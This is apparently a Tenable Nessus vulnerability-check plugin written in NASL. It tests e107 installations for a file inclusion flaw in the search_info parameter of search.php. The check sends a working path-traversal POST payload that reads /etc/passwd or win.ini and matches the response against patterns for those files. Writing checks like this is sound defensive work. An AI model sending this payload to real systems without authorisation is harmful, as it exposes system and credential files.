#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(18222);
  script_version("1.37");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_bugtraq_id(13572);

  script_name(english:"e107 search.php search_info Parameter Traversal Arbitrary File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of e107 installed on the remote host is affected by a
remote file inclusion vulnerability because it fails to properly
sanitize user-supplied input to the 'search_info' parameter of the
'search.php' script.  This vulnerability could allow a remote,
unauthenticated attacker to view arbitrary files or execute arbitrary
PHP code, possibly taken from third-party hosts, on the remote host.

Note that this requires that the search page is not restricted to
members.  This setting is found in the 'Security & Protection' menu
or the 'Site Preferences' accessed in the admin panel.

Note that the application is also reportedly affected by several
additional vulnerabilities including global variable updates, remote
file includes, directory traversal, information disclosure, cross-site
scripting, and SQL injection; however, Nessus has not tested for these
additional issues.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2005/May/65");
  # http://old.e107.org/e107_plugins/bugtrack/bugtrack.php?action=show&id=558
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?29d667cf");
  script_set_attribute(attribute:"solution", value:
"Upgrade to e107 version 0.7.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/06/12");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/01/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/05/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("e107_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/e107");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");
include("data_protection.inc");

port = get_http_port(default:80, php:TRUE);

# Test an install.
install = get_install_from_kb(appname:'e107', port:port, exit_on_fail:TRUE);

dir = install['dir'];
install_url = build_url(port:port, qs:dir);

# Verify search.php is accesible for unauthenticated users
res = http_send_recv3(
  method : "GET",
  item   : dir + "/search.php",
  port   : port,
  exit_on_fail : TRUE
);

if(">You must be logged in to access this page<" >< res[2])
  exit(0, "Nessus was unable to test for this issue as the search page at " +
  install_url + "/search.php is only accessible for authenticated users.");

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  attack =  mult_str(str:"../", nb:12) + file;
  postdata = "searchquery=aaa&search_info[0][sfile]=./" + attack +
             "&searchtype[0]=0&searchtype[1]=0";

  res2 = http_send_recv3(
    method : "POST",
    item   : dir + "/search.php",
    port   : port,
    data   : postdata,
    content_type : "application/x-www-form-urlencoded",
    exit_on_fail : TRUE
  );

  if (egrep(pattern:file_pats[file], string:res2[2]))
  {
    # Format output for reporting to include only ouptut from the file
    # we read in and limit to 15 lines
    output = strstr(res2[2], "overflow:auto;'>") - "overflow:auto;'>";
    output = beginning_of_response(resp:output, max_lines:'15');

    if (report_verbosity > 0)
    {
      snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report =
        '\nNessus was able to verify the issue exists using the following request :' +
        '\n' +
        '\n' + http_last_sent_request() +
        '\n';
      if (report_verbosity > 1)
      {
        output = data_protection::redact_etc_passwd(output:output);
        report +=
          '\n' + 'This produced the following truncated output :' +
          '\n' +
          '\n' + snip +
          '\n' + output +
          '\n' + snip +
          '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", install_url);
